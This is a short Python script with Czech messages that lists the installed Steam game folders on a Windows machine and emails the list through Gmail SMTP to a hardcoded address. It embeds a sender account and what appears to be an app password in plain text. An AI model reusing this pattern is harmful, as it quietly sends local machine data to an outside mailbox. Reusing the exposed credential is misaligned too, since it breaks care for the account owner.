import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

def get_installed_steam_games(possible_paths):
    games = []

    for steam_path in possible_paths:
        if os.path.exists(steam_path):
            for item in os.listdir(steam_path):
                item_path = os.path.join(steam_path, item)
                if os.path.isdir(item_path):
                    games.append(item)

    return games

def send_email(subject, body, to_email, from_email, from_password):
    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = subject

    msg.attach(MIMEText(body, 'plain'))

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(from_email, from_password)
    text = msg.as_string()
    server.sendmail(from_email, to_email, text)
    server.quit()

def main():
    possible_paths = [
        'C:\\Program Files (x86)\\Steam\\steamapps\\common',
        'D:\\Steam\\steamapps\\common',
        'C:\\Program Files\\Steam\\steamapps\\common'
    ]
    to_email = 'zemlicka98@email.cz'
    from_email = 'testing.code0298@gmail.com'
    from_password = 'owks vobm vqht hmyd '

    games = get_installed_steam_games(possible_paths)
    if games:
        game_list = "\n".join(games)
        subject = "Seznam nainstalovaných her na Steamu"
        body = f"Seznam nainstalovaných her na Steamu:\n\n{game_list}"
        send_email(subject, body, to_email, from_email, from_password)
        print("E-mail byl úspěšně odeslán.")
    else:
        print("Nebyly nalezeny žádné nainstalované hry nebo došlo k chybě.")

if __name__ == "__main__":
    main()
